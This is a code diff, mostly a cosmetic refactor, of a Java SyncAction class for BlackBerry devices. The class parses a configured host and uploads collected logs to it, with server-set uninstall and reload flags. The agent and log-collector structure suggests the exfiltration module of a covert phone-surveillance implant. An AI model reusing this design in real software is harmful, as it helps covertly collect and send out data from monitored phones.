@@ -10,14 +10,11 @@ package blackberry.action;
 import java.io.EOFException;
 
 import net.rim.device.api.util.DataBuffer;
-
 import blackberry.AgentManager;
-import blackberry.Common;
 import blackberry.agent.Agent;
 import blackberry.event.Event;
 import blackberry.log.LogCollector;
 import blackberry.transfer.Transfer;
-import blackberry.transfer.WifiConnection;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -25,7 +22,7 @@ import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 public class SyncAction extends SubAction {
-	//#debug
+    //#debug
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
 
     LogCollector logCollector;
@@ -40,7 +37,7 @@ public class SyncAction extends SubAction {
     String host = "";
     int port = 80;
 
-    public SyncAction(int actionId_, byte[] confParams) {
+    public SyncAction(final int actionId_, final byte[] confParams) {
         super(actionId_);
         parse(confParams);
 
@@ -53,12 +50,12 @@ public class SyncAction extends SubAction {
         transfer = Transfer.getInstance();
     }
 
-    public SyncAction(String host_) {
+    public SyncAction(final String host_) {
         super(ACTION_SYNC);
         this.host = host_;
     }
 
-    public boolean execute(Event triggeringEvent) {
+    public boolean execute(final Event triggeringEvent) {
         // #debug
         debug.info("SyncAction execute: " + triggeringEvent);
 
@@ -88,7 +85,7 @@ public class SyncAction extends SubAction {
 
         Utils.sleep(2500);
 
-        boolean ret = transfer.send();
+        final boolean ret = transfer.send();
 
         this.wantUninstall = transfer.uninstall;
         this.wantReload = transfer.reload;
@@ -105,21 +102,21 @@ public class SyncAction extends SubAction {
         return false;
     }
 
-    protected boolean parse(byte[] confParams) {
-        DataBuffer databuffer = new DataBuffer(confParams, 0,
+    protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
         try {
             this.gprs = databuffer.readInt() == 1;
             this.wifi = databuffer.readInt() == 1;
 
-            int len = databuffer.readInt();
-            byte[] buffer = new byte[len];
+            final int len = databuffer.readInt();
+            final byte[] buffer = new byte[len];
             databuffer.readFully(buffer);
 
-            host = WChar.getString(buffer,  true);
+            host = WChar.getString(buffer, true);
 
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             // #debug
             debug.error("params FAILED");
             return false;
